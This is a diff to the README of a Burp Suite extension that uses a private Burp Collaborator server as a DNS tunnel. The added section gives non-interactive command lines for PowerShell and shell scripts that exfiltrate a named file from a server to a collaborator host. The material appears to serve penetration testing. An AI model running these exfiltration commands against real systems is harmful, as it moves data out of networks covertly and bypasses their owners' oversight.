@@ -3,7 +3,7 @@ A DNS tunnel utilizing the Burp Collaborator.
 
 This extension sets up a private Burp Collaborator server as a DNS tunnel.  One of the provided scripts will be used to exfiltrate data from a server through the DNS tunnel, displaying the tunneled data in Burp Suite.
 
-### Usage with scripts
+### Interactive usage with scripts
 Multiple scripts exist for exfiltrating data from different environments.  The scripts will be set up on the box to exfiltrate data from and will connect to a Burp Suite instance on our local box.
 
 _[B] Burp Suite_
@@ -16,6 +16,20 @@ _[S] Script_
 4) [S] Enter the Burp Collaborator address from (2) when prompted
 5) [S] Paste file name to be tunneled when prompted
 6) [B] After tunneling is completed click "Poll now"
+
+### Non-interactive usage with scripts
+The scripts don't require user interaction if all the necessary information is provided as arguments. 
+
+_[B] Burp Suite_
+
+_[S] Script_
+
+1) [B] Click "Start listening"
+2) [B] Copy the printed location of the Burp Collaborator server
+3) [S] Run the script
+    - Windows: `./tunnel.ps1 abc123.private-burp.com .\test.txt`
+    - Linux: `./tunnel.sh -d abc123.private-burp.com -f test.txt`
+4) [B] After tunneling is completed click "Poll now"
 
 ### Usage between 2 Burp Suite instances
 _[R] Receiving Burp instance_
